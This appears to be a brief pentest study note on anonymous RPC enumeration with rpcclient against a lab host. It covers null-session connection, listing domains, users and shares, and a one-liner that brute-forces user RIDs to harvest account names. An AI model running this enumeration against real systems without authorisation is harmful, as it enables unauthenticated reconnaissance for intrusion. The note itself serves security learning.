#rpc #RemoteProcedureCall #localsystemmanagement

- [[RPCclient]] -U "" 10.129.14.128 # connect as anonymous
- Look at domains
- Look at users
- look at server info
- check all shares

Attacks
- Brute force user IDs
	- `for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`
- 
